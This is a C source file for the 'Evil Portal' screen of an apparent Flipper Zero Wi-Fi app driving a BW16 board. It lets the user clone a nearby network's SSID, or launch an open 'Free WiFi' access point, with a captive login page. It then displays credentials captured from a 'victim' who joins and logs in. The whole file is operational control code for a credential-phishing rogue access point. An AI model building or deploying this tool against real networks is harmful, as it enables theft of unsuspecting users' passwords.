#include "portal_view.h"
#include "../uart_handler.h"
#include <gui/elements.h>
#include <stdio.h>
#include <string.h>

/* Evil Portal:
 *   PICK   – choose an AP whose SSID to clone
 *   STATUS – BW16 runs an open AP + captive login page,
 *            captured creds shown live, Back stops it.         */

#define ROWS  4
#define ROW_H 12
#define HDR_H 12

typedef enum { PG_PICK, PG_STATUS } PortPage;
typedef struct {
    WifiStudyApp* app;
    PortPage page;
    int      sel;
    int      scroll;
} PortalModel;

static void draw_pick(Canvas* canvas, WifiStudyApp* app, PortalModel* pm) {
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_box(canvas, 0, 0, 128, HDR_H);
    canvas_set_color(canvas, ColorWhite);
    canvas_draw_str(canvas, 2, 9, "Portal: clone AP");
    if(app->bw16_ok) canvas_draw_box(canvas, 118, 3, 6, 6);
    canvas_set_color(canvas, ColorBlack);
    canvas_set_font(canvas, FontSecondary);

    if(app->ap_count == 0) {
        canvas_draw_str_aligned(canvas, 64, 28, AlignCenter, AlignCenter,
            "No scanned networks");
        canvas_draw_box(canvas, 4, 38, 120, 14);
        canvas_set_color(canvas, ColorWhite);
        canvas_draw_str_aligned(canvas, 64, 48, AlignCenter, AlignCenter,
            "OK: launch \"Free WiFi\"");
        canvas_set_color(canvas, ColorBlack);
        canvas_draw_str_aligned(canvas, 64, 61, AlignCenter, AlignCenter,
            "or scan to clone a real AP");
        return;
    }

    for(int i=0; i<ROWS && (pm->scroll+i)<app->ap_count; i++) {
        const ApRecord* ap = &app->aps[pm->scroll+i];
        uint8_t y = HDR_H + (uint8_t)i*ROW_H;
        bool sel = (pm->scroll+i == pm->sel);
        if(sel) { canvas_draw_box(canvas, 0, y, 128, ROW_H);
                  canvas_set_color(canvas, ColorWhite); }
        char ssid[17]; strncpy(ssid, ap->ssid, 16); ssid[16]='\0';
        canvas_draw_str(canvas, 2, y+9, ssid);
        char ch[5]; snprintf(ch, sizeof(ch), "%u", ap->channel);
        canvas_draw_str(canvas, 108, y+9, ch);
        if(sel) canvas_set_color(canvas, ColorBlack);
    }
}

static void draw_status(Canvas* canvas, WifiStudyApp* app) {
    furi_mutex_acquire(app->data_mutex, FuriWaitForever);
    PortalState p = app->portal;
    furi_mutex_release(app->data_mutex);

    canvas_set_font(canvas, FontPrimary);
    canvas_draw_box(canvas, 0, 0, 128, HDR_H);
    canvas_set_color(canvas, ColorWhite);
    canvas_draw_str(canvas, 2, 9, "Portal LIVE");
    canvas_set_color(canvas, ColorBlack);
    canvas_set_font(canvas, FontSecondary);

    char ssid[24]; snprintf(ssid, sizeof(ssid), "AP: %.16s", p.ssid);
    canvas_draw_str(canvas, 2, 22, ssid);
    char cl[22]; snprintf(cl, sizeof(cl), "Clients: %u", p.clients);
    canvas_draw_str(canvas, 2, 32, cl);
    canvas_draw_line(canvas, 0, 36, 127, 36);

    if(p.got_creds) {
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 2, 47, "CAPTURED:");
        canvas_set_font(canvas, FontSecondary);
        char creds[21]; strncpy(creds, p.last_creds, 20); creds[20]='\0';
        canvas_draw_str(canvas, 2, 57, creds);
    } else {
        canvas_draw_str_aligned(canvas, 64, 47, AlignCenter, AlignCenter,
                                "Waiting for victim");
        canvas_draw_str_aligned(canvas, 64, 56, AlignCenter, AlignCenter,
                                "to join & log in");
    }
    canvas_draw_str(canvas, 2, 63, "Back=stop");
}

static void portal_draw_cb(Canvas* canvas, void* model) {
    PortalModel* pm = (PortalModel*)model;
    WifiStudyApp* app = pm->app;
    canvas_clear(canvas);
    if(pm->page == PG_STATUS) { draw_status(canvas, app); return; }

    furi_mutex_acquire(app->data_mutex, FuriWaitForever);
    if(pm->sel >= app->ap_count) pm->sel = app->ap_count>0?app->ap_count-1:0;
    if(pm->sel < 0) pm->sel = 0;
    if(pm->scroll > pm->sel) pm->scroll = pm->sel;
    if(pm->sel >= pm->scroll+ROWS) pm->scroll = pm->sel-ROWS+1;
    if(pm->scroll < 0) pm->scroll = 0;
    draw_pick(canvas, app, pm);
    furi_mutex_release(app->data_mutex);
}

static bool portal_input_cb(InputEvent* ev, void* model) {
    PortalModel* pm = (PortalModel*)model;
    WifiStudyApp* app = pm->app;
    if(ev->type != InputTypeShort && ev->type != InputTypeRepeat) return false;

    if(pm->page == PG_STATUS) {
        if(ev->key == InputKeyBack) {
            uart_send_cmd(app, "CMD,STOP");
            furi_mutex_acquire(app->data_mutex, FuriWaitForever);
            app->portal.active = false;
            furi_mutex_release(app->data_mutex);
            pm->page = PG_PICK;
            return true;
        }
        return true;
    }

    /* PG_PICK */
    if(ev->key == InputKeyBack) return false;

    furi_mutex_acquire(app->data_mutex, FuriWaitForever);
    int total = app->ap_count;
    char ssid[SSID_LEN]={0}; uint8_t ch=0;
    if(pm->sel>=0 && pm->sel<total) {
        strncpy(ssid, app->aps[pm->sel].ssid, SSID_LEN-1);
        ch = app->aps[pm->sel].channel;
    }
    furi_mutex_release(app->data_mutex);

    if(ev->key == InputKeyUp)   { if(pm->sel>0) pm->sel--; }
    else if(ev->key == InputKeyDown) { if(pm->sel+1<total) pm->sel++; }
    else if(ev->key == InputKeyOk) {
        /* With no scan, launch a default open SSID; otherwise clone selected AP */
        if(total == 0) { strncpy(ssid, "Free WiFi", SSID_LEN-1); ch = 6; }
        else if(pm->sel < 0 || pm->sel >= total) return true;
        furi_mutex_acquire(app->data_mutex, FuriWaitForever);
        memset(&app->portal, 0, sizeof(PortalState));
        strncpy(app->portal.ssid, ssid, SSID_LEN-1);
        app->portal.channel = ch;
        furi_mutex_release(app->data_mutex);
        char cmd[80];
        snprintf(cmd, sizeof(cmd), "CMD,PORTAL,%s,%u", ssid, ch);
        uart_send_cmd(app, cmd);
        pm->page = PG_STATUS;
    }
    return true;
}

/* If an AP is already up (Soft AP from the Attack menu) show status,
 * otherwise show the AP picker. */
static void portal_enter_cb(void* context) {
    PortalModel* pm = (PortalModel*)context;
    if(pm->app->portal.active) {
        pm->page = PG_STATUS;
    } else {
        pm->page = PG_PICK; pm->sel = 0; pm->scroll = 0;
    }
}

View* portal_view_alloc(WifiStudyApp* app) {
    View* v = view_alloc();
    view_allocate_model(v, ViewModelTypeLocking, sizeof(PortalModel));
    PortalModel* m = view_get_model(v);
    m->app=app; m->page=PG_PICK; m->sel=0; m->scroll=0;
    view_commit_model(v, false);
    view_set_context(v, m);
    view_set_draw_callback(v, portal_draw_cb);
    view_set_input_callback(v, portal_input_cb);
    view_set_enter_callback(v, portal_enter_cb);
    return v;
}

void portal_view_free(View* v) { view_free(v); }
